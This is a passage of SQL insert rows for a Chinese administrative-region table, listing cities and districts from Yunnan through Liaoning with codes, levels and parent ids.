(349, '15311', '红河州', 2, '153', 0),
(350, '15312', '西双版纳州', 2, '153', 0),
(351, '15313', '楚雄州', 2, '153', 0),
(352, '15314', '大理州', 2, '153', 0),
(353, '15315', '德宏州', 2, '153', 0),
(354, '15316', '怒江州', 2, '153', 0),
(355, '15317', '迪庆州', 2, '153', 0),
(356, '9924', '其他城市', 2, '153', 0),
(357, '2901', '拉萨市', 2, '154', 0),
(358, '2903', '昌都地区', 2, '154', 0),
(359, '2905', '山南地区', 2, '154', 0),
(360, '15404', '日喀则地区', 2, '154', 0),
(361, '2902', '那曲地区', 2, '154', 0),
(362, '15406', '阿里地区', 2, '154', 0),
(363, '2904', '林芝地区', 2, '154', 0),
(364, '9929', '其他城市', 2, '154', 0),
(365, '20', '西安市', 2, '161', 0),
(366, '1309', '铜川市', 2, '161', 0),
(367, '1307', '宝鸡市', 2, '161', 0),
(368, '1302', '咸阳市', 2, '161', 0),
(369, '1305', '渭南市', 2, '161', 0),
(370, '1306', '延安市', 2, '161', 0),
(371, '1308', '汉中市', 2, '161', 0),
(372, '1303', '榆林市', 2, '161', 0),
(373, '1304', '安康市', 2, '161', 0),
(374, '16110', '商洛市', 2, '161', 0),
(375, '9913', '其他城市', 2, '161', 0),
(376, '2701', '兰州市', 2, '162', 0),
(377, '2702', '嘉峪关市', 2, '162', 0),
(378, '2703', '金昌市', 2, '162', 0),
(379, '16204', '白银市', 2, '162', 0),
(380, '2704', '天水市', 2, '162', 0),
(381, '16206', '武威市', 2, '162', 0),
(382, '16207', '张掖市', 2, '162', 0),
(383, '16208', '平凉市', 2, '162', 0),
(384, '2706', '酒泉市', 2, '162', 0),
(385, '16210', '庆阳市', 2, '162', 0),
(386, '16211', '定西市', 2, '162', 0),
(387, '16212', '陇南市', 2, '162', 0),
(388, '16213', '临夏州', 2, '162', 0),
(389, '16214', '甘南州', 2, '162', 0),
(390, '9927', '其他城市', 2, '162', 0),
(391, '3101', '西宁市', 2, '163', 0),
(392, '3102', '海东地区', 2, '163', 0),
(393, '3103', '海北州', 2, '163', 0),
(394, '3105', '黄南州', 2, '163', 0),
(395, '3104', '海南州', 2, '163', 0),
(396, '16306', '果洛州', 2, '163', 0),
(397, '16307', '玉树州', 2, '163', 0),
(398, '16308', '海西州', 2, '163', 0),
(399, '9931', '其他城市', 2, '163', 0),
(400, '2801', '银川市', 2, '164', 0),
(401, '2802', '石嘴山市', 2, '164', 0),
(402, '2803', '吴忠市', 2, '164', 0),
(403, '2804', '固原市', 2, '164', 0),
(404, '16405', '中卫市', 2, '164', 0),
(405, '9928', '其他城市', 2, '164', 0),
(406, '2601', '乌鲁木齐市', 2, '165', 0),
(407, '2613', '克拉玛依市', 2, '165', 0),
(408, '16503', '吐鲁番地区', 2, '165', 0),
(409, '16504', '哈密地区', 2, '165', 0),
(410, '2604', '和田地区', 2, '165', 0),
(411, '2603', '阿克苏地区', 2, '165', 0),
(412, '2602', '喀什地区', 2, '165', 0),
(413, '16508', '克孜勒苏柯尔克孜自治州', 2, '165', 0),
(414, '16509', '巴音郭楞蒙古自治州', 2, '165', 0),
(415, '2605', '昌吉回族自治州', 2, '165', 0),
(416, '16511', '博尔塔拉蒙古自治州', 2, '165', 0),
(417, '16512', '伊犁哈萨克自治州', 2, '165', 0),
(418, '16513', '塔城地区', 2, '165', 0),
(419, '16514', '阿勒泰地区', 2, '165', 0),
(420, '2612', '石河子市', 2, '165', 0),
(421, '16516', '阿拉尔市', 2, '165', 0),
(422, '16517', '图木舒克市', 2, '165', 0),
(423, '16518', '五家渠市', 2, '165', 0),
(424, '9926', '其他城市', 2, '165', 0),
(425, '3501', '台北市', 2, '171', 0),
(426, '3502', '高雄市', 2, '171', 0),
(427, '3503', '台中市', 2, '171', 0),
(428, '17105', '台南市', 2, '171', 0),
(429, '3506', '新竹市', 2, '171', 0),
(430, '3509', '嘉义市', 2, '171', 0),
(431, '17108', '台北县', 2, '171', 0),
(432, '3507', '桃园县', 2, '171', 0),
(433, '17111', '新竹县', 2, '171', 0),
(434, '17112', '苗栗县', 2, '171', 0),
(435, '17113', '台中县', 2, '171', 0),
(436, '3508', '彰化县', 2, '171', 0),
(437, '3510', '南投县', 2, '171', 0),
(438, '17116', '云林县', 2, '171', 0),
(439, '17117', '嘉义县', 2, '171', 0),
(440, '17118', '台南县', 2, '171', 0),
(441, '17119', '高雄县', 2, '171', 0),
(442, '17124', '南投市', 2, '171', 0),
(443, '17125', '彰化市', 2, '171', 0),
(444, '10', '香港特别行政区', 2, '172', 0),
(445, '3401', '澳门特别行政区', 2, '173', 0),
(446, '1110101', '东城区', 3, '1', 0),
(447, '1110102', '西城区', 3, '1', 0),
(448, '1110103', '崇文区', 3, '1', 0),
(449, '1110104', '宣武区', 3, '1', 0),
(450, '1110105', '朝阳区', 3, '1', 0),
(451, '1110106', '丰台区', 3, '1', 0),
(452, '1110107', '石景山区', 3, '1', 0),
(453, '1110108', '海淀区', 3, '1', 0),
(454, '11109', '门头沟区', 3, '1', 0),
(455, '11110', '房山区', 3, '1', 0),
(456, '104', '通州区', 3, '1', 0),
(457, '101', '顺义区', 3, '1', 0),
(458, '103', '昌平区', 3, '1', 0),
(459, '102', '大兴区', 3, '1', 0),
(460, '1110115', '怀柔区', 3, '1', 0),
(461, '1110116', '平谷区', 3, '1', 0),
(462, '1110117', '延庆县', 3, '1', 0),
(463, '1110118', '密云县', 3, '1', 0),
(464, '1120101', '和平区', 3, '14', 0),
(465, '1120102', '河东区', 3, '14', 0),
(466, '1120103', '河西区', 3, '14', 0),
(467, '1120104', '南开区', 3, '14', 0),
(468, '1120105', '河北区', 3, '14', 0),
(469, '1120106', '红桥区', 3, '14', 0),
(470, '1120107', '塘沽区', 3, '14', 0),
(471, '1120108', '汉沽区', 3, '14', 0),
(472, '1120109', '大港区', 3, '14', 0),
(473, '1120110', '东丽区', 3, '14', 0),
(474, '1120111', '西青区', 3, '14', 0),
(475, '1120112', '津南区', 3, '14', 0),
(476, '1120113', '北辰区', 3, '14', 0),
(477, '1120114', '武清区', 3, '14', 0),
(478, '1120115', '宝坻区', 3, '14', 0),
(479, '1120116', '蓟县', 3, '14', 0),
(480, '1120117', '宁河县', 3, '14', 0),
(481, '1120118', '静海县', 3, '14', 0),
(482, '1120199', '其他区县', 3, '14', 0),
(483, '1130118', '高新技术产业开发区', 3, '601', 0),
(484, '1130101', '长安区', 3, '601', 0),
(485, '1130102', '桥东区', 3, '601', 0),
(486, '1130103', '桥西区', 3, '601', 0),
(487, '1130104', '新华区', 3, '601', 0),
(488, '1130105', '裕华区', 3, '601', 0),
(489, '1130106', '井陉矿区', 3, '601', 0),
(490, '1130107', '辛集市', 3, '601', 0),
(491, '1130108', '藁城市', 3, '601', 0),
(492, '1130109', '晋州市', 3, '601', 0),
(493, '1130110', '新乐市', 3, '601', 0),
(494, '1130111', '鹿泉市', 3, '601', 0),
(495, '1130112', '井陉县', 3, '601', 0),
(496, '1130113', '正定县', 3, '601', 0),
(497, '1130114', '栾城县', 3, '601', 0),
(498, '1130115', '行唐县', 3, '601', 0),
(499, '1130116', '灵寿县', 3, '601', 0),
(500, '1130117', '高邑县', 3, '601', 0),
(501, '1130199', '其他区县', 3, '601', 0),
(502, '1130122', '深泽县', 3, '601', 0),
(503, '1130120', '赞皇县', 3, '601', 0),
(504, '1130123', '无极县', 3, '601', 0),
(505, '1130119', '元氏县', 3, '601', 0),
(506, '1130121', '赵县', 3, '601', 0),
(507, '1130124', '平山县', 3, '601', 0),
(508, '1130201', '路北区', 3, '605', 0),
(509, '1130202', '路南区', 3, '605', 0),
(510, '1130203', '古冶区', 3, '605', 0),
(511, '1130204', '开平区', 3, '605', 0),
(512, '1130205', '丰润区', 3, '605', 0),
(513, '1130206', '丰南区', 3, '605', 0),
(514, '1130207', '遵化市', 3, '605', 0),
(515, '1130208', '迁安市', 3, '605', 0),
(516, '1130209', '滦县', 3, '605', 0),
(517, '1130210', '滦南县', 3, '605', 0),
(518, '1130211', '乐亭县', 3, '605', 0),
(519, '1130212', '迁西县', 3, '605', 0),
(520, '1130213', '玉田县', 3, '605', 0),
(521, '1130214', '唐海县', 3, '605', 0),
(522, '1130299', '其他区县', 3, '605', 0),
(523, '1130215', '高新区', 3, '605', 0),
(524, '1130301', '海港区', 3, '604', 0),
(525, '1130302', '山海关区', 3, '604', 0),
(526, '1130303', '北戴河区', 3, '604', 0),
(527, '1130304', '昌黎县', 3, '604', 0),
(528, '1130305', '抚宁县', 3, '604', 0),
(529, '1130306', '卢龙县', 3, '604', 0),
(530, '1130307', '青龙满族自治县', 3, '604', 0),
(531, '1130399', '其他区县', 3, '604', 0),
(532, '1130308', '经济技术开发区', 3, '604', 0),
(533, '1130420', '高开区', 3, '607', 0),
(534, '1130401', '丛台区', 3, '607', 0),
(535, '1130402', '邯山区', 3, '607', 0),
(536, '1130403', '复兴区', 3, '607', 0),
(537, '1130404', '峰峰矿区', 3, '607', 0),
(538, '1130405', '武安市', 3, '607', 0),
(539, '1130406', '邯郸县', 3, '607', 0),
(540, '1130407', '临漳县', 3, '607', 0),
(541, '1130408', '成安县', 3, '607', 0),
(542, '1130409', '大名县', 3, '607', 0),
(543, '1130410', '涉县', 3, '607', 0),
(544, '1130411', '磁县', 3, '607', 0),
(545, '1130412', '肥乡县', 3, '607', 0),
(546, '1130413', '永年县', 3, '607', 0),
(547, '1130414', '邱县', 3, '607', 0),
(548, '1130415', '鸡泽县', 3, '607', 0),
(549, '1130416', '广平县', 3, '607', 0),
(550, '1130417', '馆陶县', 3, '607', 0),
(551, '1130418', '魏县', 3, '607', 0),
(552, '1130419', '曲周县', 3, '607', 0),
(553, '1130499', '其他区县', 3, '607', 0),
(554, '1130501', '桥东区', 3, '606', 0),
(555, '1130502', '桥西区', 3, '606', 0),
(556, '1130503', '南宫市', 3, '606', 0),
(557, '1130504', '沙河市', 3, '606', 0),
(558, '1130505', '邢台县', 3, '606', 0),
(559, '1130506', '临城县', 3, '606', 0),
(560, '1130507', '内丘县', 3, '606', 0),
(561, '1130508', '柏乡县', 3, '606', 0),
(562, '1130509', '隆尧县', 3, '606', 0),
(563, '1130510', '任县', 3, '606', 0),
(564, '1130511', '南和县', 3, '606', 0),
(565, '1130512', '宁晋县', 3, '606', 0),
(566, '1130513', '巨鹿县', 3, '606', 0),
(567, '1130514', '新河县', 3, '606', 0),
(568, '1130515', '广宗县', 3, '606', 0),
(569, '1130516', '平乡县', 3, '606', 0),
(570, '1130517', '威县', 3, '606', 0),
(571, '1130518', '清河县', 3, '606', 0),
(572, '1130519', '临西县', 3, '606', 0),
(573, '1130599', '其他区县', 3, '606', 0),
(574, '1130601', '新市区', 3, '608', 0),
(575, '1130602', '北市区', 3, '608', 0),
(576, '1130603', '南市区', 3, '608', 0),
(577, '1130604', '定州市', 3, '608', 0),
(578, '611', '涿州市', 3, '608', 0),
(579, '1130606', '安国市', 3, '608', 0),
(580, '1130607', '高碑店市', 3, '608', 0),
(581, '1130608', '满城县', 3, '608', 0),
(582, '1130609', '清苑县', 3, '608', 0),
(583, '1130610', '易县', 3, '608', 0),
(584, '1130611', '徐水县', 3, '608', 0),
(585, '1130612', '涞源县', 3, '608', 0),
(586, '1130613', '定兴县', 3, '608', 0),
(587, '1130614', '顺平县', 3, '608', 0),
(588, '1130615', '唐县', 3, '608', 0),
(589, '1130616', '望都县', 3, '608', 0),
(590, '1130617', '涞水县', 3, '608', 0),
(591, '1130618', '高阳县', 3, '608', 0),
(592, '1130619', '安新县', 3, '608', 0),
(593, '1130620', '雄县', 3, '608', 0),
(594, '1130621', '容城县', 3, '608', 0),
(595, '1130622', '曲阳县', 3, '608', 0),
(596, '1130623', '阜平县', 3, '608', 0),
(597, '1130624', '博野县', 3, '608', 0),
(598, '1130625', '蠡县', 3, '608', 0),
(599, '1130699', '其他区县', 3, '608', 0),
(600, '1130718', '高新区', 3, '602', 0),
(601, '1130701', '桥西区', 3, '602', 0),
(602, '1130702', '桥东区', 3, '602', 0),
(603, '1130703', '宣化区', 3, '602', 0),
(604, '1130704', '下花园区', 3, '602', 0),
(605, '1130705', '宣化县', 3, '602', 0),
(606, '1130706', '张北县', 3, '602', 0),
(607, '1130707', '康保县', 3, '602', 0),
(608, '1130708', '沽源县', 3, '602', 0),
(609, '1130709', '尚义县', 3, '602', 0),
(610, '1130710', '蔚县', 3, '602', 0),
(611, '1130711', '阳原县', 3, '602', 0),
(612, '1130712', '怀安县', 3, '602', 0),
(613, '1130713', '万全县', 3, '602', 0),
(614, '1130714', '怀来县', 3, '602', 0),
(615, '1130715', '涿鹿县', 3, '602', 0),
(616, '1130716', '赤城县', 3, '602', 0),
(617, '1130717', '崇礼县', 3, '602', 0),
(618, '1130799', '其他区县', 3, '602', 0),
(619, '1130801', '双桥区', 3, '603', 0),
(620, '1130802', '双滦区', 3, '603', 0),
(621, '1130803', '鹰手营子矿区', 3, '603', 0),
(622, '1130804', '承德县', 3, '603', 0),
(623, '1130805', '兴隆县', 3, '603', 0),
(624, '1130806', '平泉县', 3, '603', 0),
(625, '1130807', '滦平县', 3, '603', 0),
(626, '1130808', '隆化县', 3, '603', 0),
(627, '1130809', '丰宁满族自治县', 3, '603', 0),
(628, '1130810', '宽城满族自治县', 3, '603', 0),
(629, '1130811', '围场满族蒙古族自治县', 3, '603', 0),
(630, '1130899', '其他区县', 3, '603', 0),
(631, '1130901', '运河区', 3, '609', 0),
(632, '1130902', '新华区', 3, '609', 0),
(633, '1130903', '泊头市', 3, '609', 0),
(634, '1130904', '任丘市', 3, '609', 0),
(635, '1130905', '黄骅市', 3, '609', 0),
(636, '1130906', '河间市', 3, '609', 0),
(637, '1130907', '沧县', 3, '609', 0),
(638, '1130908', '青县', 3, '609', 0),
(639, '1130909', '东光县', 3, '609', 0),
(640, '1130910', '海兴县', 3, '609', 0),
(641, '1130911', '盐山县', 3, '609', 0),
(642, '1130912', '肃宁县', 3, '609', 0),
(643, '1130913', '南皮县', 3, '609', 0),
(644, '1130914', '吴桥县', 3, '609', 0),
(645, '1130915', '献县', 3, '609', 0),
(646, '1130916', '孟村回族自治县', 3, '609', 0),
(647, '1130999', '其他区县', 3, '609', 0),
(648, '1131001', '安次区', 3, '610', 0),
(649, '1131002', '广阳区', 3, '610', 0),
(650, '1131003', '霸州市', 3, '610', 0),
(651, '1131004', '三河市', 3, '610', 0),
(652, '1131005', '固安县', 3, '610', 0),
(653, '1131006', '永清县', 3, '610', 0),
(654, '1131007', '香河县', 3, '610', 0),
(655, '1131008', '大城县', 3, '610', 0),
(656, '1131009', '文安县', 3, '610', 0),
(657, '1131010', '大厂回族自治县', 3, '610', 0),
(658, '1131099', '其他区县', 3, '610', 0),
(659, '1131101', '桃城区', 3, '11311', 0),
(660, '1131102', '冀州市', 3, '11311', 0),
(661, '1131103', '深州市', 3, '11311', 0),
(662, '1131104', '枣强县', 3, '11311', 0),
(663, '1131105', '武邑县', 3, '11311', 0),
(664, '1131106', '武强县', 3, '11311', 0),
(665, '1131107', '饶阳县', 3, '11311', 0),
(666, '1131108', '安平县', 3, '11311', 0),
(667, '1131109', '故城县', 3, '11311', 0),
(668, '1131110', '景县', 3, '11311', 0),
(669, '1131111', '阜城县', 3, '11311', 0),
(670, '1131199', '其他区县', 3, '11311', 0),
(671, '1140101', '杏花岭区', 3, '1201', 0),
(672, '1140102', '小店区', 3, '1201', 0),
(673, '1140103', '迎泽区', 3, '1201', 0),
(674, '1140104', '尖草坪区', 3, '1201', 0),
(675, '1140105', '万柏林区', 3, '1201', 0),
(676, '1140106', '晋源区', 3, '1201', 0),
(677, '1213', '古交市', 3, '1201', 0),
(678, '1212', '清徐县', 3, '1201', 0),
(679, '1214', '阳曲县', 3, '1201', 0),
(680, '1140110', '娄烦县', 3, '1201', 0),
(681, '1140199', '其他区县', 3, '1201', 0),
(682, '1140201', '城区', 3, '1202', 0),
(683, '1140202', '矿区', 3, '1202', 0),
(684, '1140203', '南郊区', 3, '1202', 0),
(685, '1140204', '新荣区', 3, '1202', 0),
(686, '1140205', '阳高县', 3, '1202', 0),
(687, '1140206', '天镇县', 3, '1202', 0),
(688, '1140207', '广灵县', 3, '1202', 0),
(689, '1140208', '灵丘县', 3, '1202', 0),
(690, '1140209', '浑源县', 3, '1202', 0),
(691, '1140210', '左云县', 3, '1202', 0),
(692, '1140211', '大同县', 3, '1202', 0),
(693, '1140299', '其他区县', 3, '1202', 0),
(694, '1140301', '城区', 3, '1204', 0),
(695, '1140302', '矿区', 3, '1204', 0),
(696, '1140303', '郊区', 3, '1204', 0),
(697, '1140304', '平定县', 3, '1204', 0),
(698, '1140305', '盂县', 3, '1204', 0),
(699, '1140399', '其他区县', 3, '1204', 0),
(700, '1140401', '城区', 3, '1206', 0),
(701, '1140402', '郊区', 3, '1206', 0),
(702, '1140403', '潞城市', 3, '1206', 0),
(703, '1140404', '长治县', 3, '1206', 0),
(704, '1140405', '襄垣县', 3, '1206', 0),
(705, '1140406', '屯留县', 3, '1206', 0),
(706, '1140407', '平顺县', 3, '1206', 0),
(707, '1140408', '黎城县', 3, '1206', 0),
(708, '1140409', '壶关县', 3, '1206', 0),
(709, '1140410', '长子县', 3, '1206', 0),
(710, '1140411', '武乡县', 3, '1206', 0),
(711, '1140412', '沁县', 3, '1206', 0),
(712, '1140413', '沁源县', 3, '1206', 0),
(713, '1140499', '其他区县', 3, '1206', 0),
(714, '1140501', '城区', 3, '1205', 0),
(715, '1140502', '高平市', 3, '1205', 0),
(716, '1140503', '泽州县', 3, '1205', 0),
(717, '1140504', '沁水县', 3, '1205', 0),
(718, '1140505', '阳城县', 3, '1205', 0),
(719, '1140506', '陵川县', 3, '1205', 0),
(720, '1140599', '其他区县', 3, '1205', 0),
(721, '1208', '榆次区', 3, '1207', 0),
(722, '1220', '介休市', 3, '1207', 0),
(723, '1140603', '榆社县', 3, '1207', 0),
(724, '1140604', '左权县', 3, '1207', 0),
(725, '1140605', '和顺县', 3, '1207', 0),
(726, '1140606', '昔阳县', 3, '1207', 0),
(727, '1140607', '寿阳县', 3, '1207', 0),
(728, '1218', '太谷县', 3, '1207', 0),
(729, '1217', '祁县', 3, '1207', 0),
(730, '1219', '平遥县', 3, '1207', 0),
(731, '1140611', '灵石县', 3, '1207', 0),
(732, '1140699', '其他区县', 3, '1207', 0),
(733, '1140701', '盐湖区', 3, '1210', 0),
(734, '1140702', '永济市', 3, '1210', 0),
(735, '1140703', '河津市', 3, '1210', 0),
(736, '1140704', '芮城县', 3, '1210', 0),
(737, '1140705', '临猗县', 3, '1210', 0),
(738, '1140706', '万荣县', 3, '1210', 0),
(739, '1140707', '新绛县', 3, '1210', 0),
(740, '1140708', '稷山县', 3, '1210', 0),
(741, '1140709', '闻喜县', 3, '1210', 0),
(742, '1140710', '夏县', 3, '1210', 0),
(743, '1140711', '绛县', 3, '1210', 0),
(744, '1140712', '平陆县', 3, '1210', 0),
(745, '1140713', '垣曲县', 3, '1210', 0),
(746, '1140799', '其他区县', 3, '1210', 0),
(747, '1140801', '忻府区', 3, '1224', 0),
(748, '1225', '原平市', 3, '1224', 0),
(749, '1140803', '定襄县', 3, '1224', 0),
(750, '1140804', '五台县', 3, '1224', 0),
(751, '1140805', '代县', 3, '1224', 0),
(752, '1140806', '繁峙县', 3, '1224', 0),
(753, '1140807', '宁武县', 3, '1224', 0),
(754, '1140808', '静乐县', 3, '1224', 0),
(755, '1140809', '神池县', 3, '1224', 0),
(756, '1140810', '五寨县', 3, '1224', 0),
(757, '1140811', '岢岚县', 3, '1224', 0),
(758, '1140812', '河曲县', 3, '1224', 0),
(759, '1140813', '保德县', 3, '1224', 0),
(760, '1140814', '偏关县', 3, '1224', 0),
(761, '1140899', '其他区县', 3, '1224', 0),
(762, '1140901', '尧都区', 3, '1211', 0),
(763, '1209', '侯马市', 3, '1211', 0),
(764, '1140903', '霍州市', 3, '1211', 0),
(765, '1140904', '曲沃县', 3, '1211', 0),
(766, '1140905', '翼城县', 3, '1211', 0),
(767, '1140906', '襄汾县', 3, '1211', 0),
(768, '1140907', '洪洞县', 3, '1211', 0),
(769, '1140908', '古县', 3, '1211', 0),
(770, '1140909', '安泽县', 3, '1211', 0),
(771, '1140910', '浮山县', 3, '1211', 0),
(772, '1140911', '吉县', 3, '1211', 0),
(773, '1140912', '乡宁县', 3, '1211', 0),
(774, '1140913', '蒲县', 3, '1211', 0),
(775, '1140914', '大宁县', 3, '1211', 0),
(776, '1140915', '永和县', 3, '1211', 0),
(777, '1140916', '隰县', 3, '1211', 0),
(778, '1140917', '汾西县', 3, '1211', 0),
(779, '1140999', '其他区县', 3, '1211', 0),
(780, '1223', '离石区', 3, '11410', 0),
(781, '1215', '孝义市', 3, '11410', 0),
(782, '1216', '汾阳市', 3, '11410', 0),
(783, '1222', '文水县', 3, '11410', 0),
(784, '1141005', '中阳县', 3, '11410', 0),
(785, '1141006', '兴县', 3, '11410', 0),
(786, '1141007', '临县', 3, '11410', 0),
(787, '1141008', '方山县', 3, '11410', 0),
(788, '1141009', '柳林县', 3, '11410', 0),
(789, '1141010', '岚县', 3, '11410', 0),
(790, '1141011', '交口县', 3, '11410', 0),
(791, '1221', '交城县', 3, '11410', 0),
(792, '1141013', '石楼县', 3, '11410', 0),
(793, '1141099', '其他区县', 3, '11410', 0),
(794, '1141101', '朔城区', 3, '1203', 0),
(795, '1141102', '平鲁区', 3, '1203', 0),
(796, '1141103', '山阴县', 3, '1203', 0),
(797, '1141104', '应县', 3, '1203', 0),
(798, '1141105', '右玉县', 3, '1203', 0),
(799, '1141106', '怀仁县', 3, '1203', 0),
(800, '1141199', '其他区县', 3, '1203', 0),
(801, '1150110', '经济开发区', 3, '1001', 0),
(802, '1150101', '回民区', 3, '1001', 0),
(803, '1150102', '新城区', 3, '1001', 0),
(804, '1150103', '玉泉区', 3, '1001', 0),
(805, '1150104', '赛罕区', 3, '1001', 0),
(806, '1150105', '托克托县', 3, '1001', 0),
(807, '1150106', '武川县', 3, '1001', 0),
(808, '1150107', '和林格尔县', 3, '1001', 0),
(809, '1150108', '清水河县', 3, '1001', 0),
(810, '1150109', '土默特左旗', 3, '1001', 0),
(811, '1150199', '其他区县', 3, '1001', 0),
(812, '1150201', '昆都仑区', 3, '1003', 0),
(813, '1150202', '东河区', 3, '1003', 0),
(814, '1150203', '青山区', 3, '1003', 0),
(815, '1150204', '石拐区', 3, '1003', 0),
(816, '1150205', '白云矿区', 3, '1003', 0),
(817, '1150206', '九原区', 3, '1003', 0),
(818, '1150207', '固阳县', 3, '1003', 0),
(819, '1150208', '土默特右旗', 3, '1003', 0),
(820, '1150209', '达尔罕茂明安联合旗', 3, '1003', 0),
(821, '1150299', '其他区县', 3, '1003', 0),
(822, '1150313', '新城区', 3, '1004', 0),
(823, '1150301', '红山区', 3, '1004', 0),
(824, '1150302', '元宝山区', 3, '1004', 0),
(825, '1150303', '松山区', 3, '1004', 0),
(826, '1150304', '宁城县', 3, '1004', 0),
(827, '1150305', '林西县', 3, '1004', 0),
(828, '1150306', '阿鲁科尔沁旗', 3, '1004', 0),
(829, '1150307', '巴林左旗', 3, '1004', 0),
(830, '1150308', '巴林右旗', 3, '1004', 0),
(831, '1150309', '克什克腾旗', 3, '1004', 0),
(832, '1150310', '翁牛特旗', 3, '1004', 0),
(833, '1150311', '喀喇沁旗', 3, '1004', 0),
(834, '1150312', '敖汉旗', 3, '1004', 0),
(835, '1150399', '其他区县', 3, '1004', 0),
(836, '1150401', '科尔沁区', 3, '1005', 0),
(837, '1150402', '霍林郭勒市', 3, '1005', 0),
(838, '1150403', '开鲁县', 3, '1005', 0),
(839, '1150404', '库伦旗', 3, '1005', 0),
(840, '1150405', '奈曼旗', 3, '1005', 0),
(841, '1150406', '扎鲁特旗', 3, '1005', 0),
(842, '1150407', '科尔沁左翼中旗', 3, '1005', 0),
(843, '1150408', '科尔沁左翼后旗', 3, '1005', 0),
(844, '1150499', '其他区县', 3, '1005', 0),
(845, '1150501', '东胜区', 3, '11505', 0),
(846, '1150502', '达拉特旗', 3, '11505', 0),
(847, '1150503', '准格尔旗', 3, '11505', 0),
(848, '1150504', '鄂托克前旗', 3, '11505', 0),
(849, '1150505', '鄂托克旗', 3, '11505', 0),
(850, '1150506', '杭锦旗', 3, '11505', 0),
(851, '1150507', '乌审旗', 3, '11505', 0),
(852, '1150508', '伊金霍洛旗', 3, '11505', 0),
(853, '1150599', '其他区县', 3, '11505', 0),
(854, '1150601', '海拉尔区', 3, '11506', 0),
(855, '710', '满洲里市', 3, '11506', 0),
(856, '1150603', '扎兰屯市', 3, '11506', 0),
(857, '1150604', '牙克石市', 3, '11506', 0),
(858, '1150605', '根河市', 3, '11506', 0),
(859, '1150606', '额尔古纳市', 3, '11506', 0),
(860, '1150607', '阿荣旗', 3, '11506', 0),
(861, '1150608', '新巴尔虎右旗', 3, '11506', 0),
(862, '1150609', '新巴尔虎左旗', 3, '11506', 0),
(863, '1150610', '陈巴尔虎旗', 3, '11506', 0),
(864, '1150611', '鄂伦春自治旗', 3, '11506', 0),
(865, '1150612', '鄂温克族自治旗', 3, '11506', 0),
(866, '1150613', '莫力达瓦达斡尔族自治旗', 3, '11506', 0),
(867, '1150699', '其他区县', 3, '11506', 0),
(868, '1150701', '临河区', 3, '11507', 0),
(869, '1150702', '五原县', 3, '11507', 0),
(870, '1150703', '磴口县', 3, '11507', 0),
(871, '1150704', '乌拉特前旗', 3, '11507', 0),
(872, '1150705', '乌拉特中旗', 3, '11507', 0),
(873, '1150706', '乌拉特后旗', 3, '11507', 0),
(874, '1150707', '杭锦后旗', 3, '11507', 0),
(875, '1150799', '其他区县', 3, '11507', 0),
(876, '1150801', '集宁区', 3, '11508', 0),
(877, '1150802', '丰镇市', 3, '11508', 0),
(878, '1150803', '卓资县', 3, '11508', 0),
(879, '1150804', '化德县', 3, '11508', 0),
(880, '1150805', '商都县', 3, '11508', 0),
(881, '1150806', '兴和县', 3, '11508', 0),
(882, '1150807', '凉城县', 3, '11508', 0),
(883, '1150808', '察哈尔右翼前旗', 3, '11508', 0),
(884, '1150809', '察哈尔右翼中旗', 3, '11508', 0),
(885, '1150810', '察哈尔右翼后旗', 3, '11508', 0),
(886, '1150811', '四子王旗', 3, '11508', 0),
(887, '1150899', '其他区县', 3, '11508', 0),
(888, '1150901', '乌兰浩特市', 3, '11509', 0),
(889, '1150902', '阿尔山市', 3, '11509', 0),
(890, '1150903', '突泉县', 3, '11509', 0),
(891, '1150904', '科尔沁右翼前旗', 3, '11509', 0),
(892, '1150905', '科尔沁右翼中旗', 3, '11509', 0),
(893, '1150906', '扎赉特旗', 3, '11509', 0),
(894, '1150999', '其他区县', 3, '11509', 0),
(895, '1151001', '锡林浩特市', 3, '11510', 0),
(896, '1151002', '二连浩特市', 3, '11510', 0),
(897, '1151003', '多伦县', 3, '11510', 0),
(898, '1151004', '阿巴嘎旗', 3, '11510', 0),
(899, '1151005', '苏尼特左旗', 3, '11510', 0),
(900, '1151006', '苏尼特右旗', 3, '11510', 0),
(901, '1151007', '东乌珠穆沁旗', 3, '11510', 0),
(902, '1151008', '西乌珠穆沁旗', 3, '11510', 0),
(903, '1151009', '太仆寺旗', 3, '11510', 0),
(904, '1151010', '镶黄旗', 3, '11510', 0),
(905, '1151011', '正镶白旗', 3, '11510', 0),
(906, '1151012', '正蓝旗', 3, '11510', 0),
(907, '1151099', '其他区县', 3, '11510', 0),
(908, '1151101', '阿拉善左旗', 3, '11511', 0),
(909, '1151102', '阿拉善右旗', 3, '11511', 0),
(910, '1151103', '额济纳旗', 3, '11511', 0),
(911, '1151199', '其他区县', 3, '11511', 0),
(912, '1151201', '海勃湾区', 3, '1002', 0),
(913, '1151202', '海南区', 3, '1002', 0),
(914, '1151203', '乌达区', 3, '1002', 0),
(915, '1151299', '其他区县', 3, '1002', 0),
(916, '1210114', '浑南经济开发区', 3, '12', 0),
(917, '1210101', '沈河区', 3, '12', 0),
(918, '1210102', '和平区', 3, '12', 0),
(919, '1210103', '大东区', 3, '12', 0),
(920, '1210104', '皇姑区', 3, '12', 0),
(921, '1210105', '铁西区', 3, '12', 0),
(922, '1210106', '苏家屯区', 3, '12', 0),
(923, '1210107', '东陵区', 3, '12', 0),
(924, '1210108', '沈北新区', 3, '12', 0),
(925, '1210109', '于洪区', 3, '12', 0),
(926, '1210110', '新民市', 3, '12', 0),
(927, '1210111', '辽中县', 3, '12', 0),
(928, '1210112', '康平县', 3, '12', 0),
(929, '1210113', '法库县', 3, '12', 0),
(930, '1210199', '其他区县', 3, '12', 0),
(931, '1210201', '西岗区', 3, '906', 0),
(932, '1210202', '中山区', 3, '906', 0),
(933, '1210203', '沙河口区', 3, '906', 0),
(934, '1210204', '甘井子区', 3, '906', 0),
(935, '1210205', '旅顺口区', 3, '906', 0),
(936, '918', '金州区', 3, '906', 0),
(937, '1210207', '瓦房店市', 3, '906', 0),
(938, '1210208', '普兰店市', 3, '906', 0),
(939, '919', '庄河市', 3, '906', 0),
(940, '1210210', '长海县', 3, '906', 0),
(941, '1210299', '其他区县', 3, '906', 0),
(942, '1210211', '开发区', 3, '906', 0),
(943, '1210301', '铁东区', 3, '907', 0),
(944, '1210302', '铁西区', 3, '907', 0),
(945, '1210303', '立山区', 3, '907', 0),
(946, '1210304', '千山区', 3, '907', 0),
(947, '1210305', '海城市', 3, '907', 0),
(948, '1210306', '台安县', 3, '907', 0),
(949, '1210307', '岫岩满族自治县', 3, '907', 0),
(950, '1210399', '其他区县', 3, '907', 0),
(951, '1210401', '顺城区', 3, '905', 0),
(952, '1210402', '新抚区', 3, '905', 0),
(953, '1210403', '东洲区', 3, '905', 0),
(954, '1210404', '望花区', 3, '905', 0),
(955, '1210405', '抚顺县', 3, '905', 0),
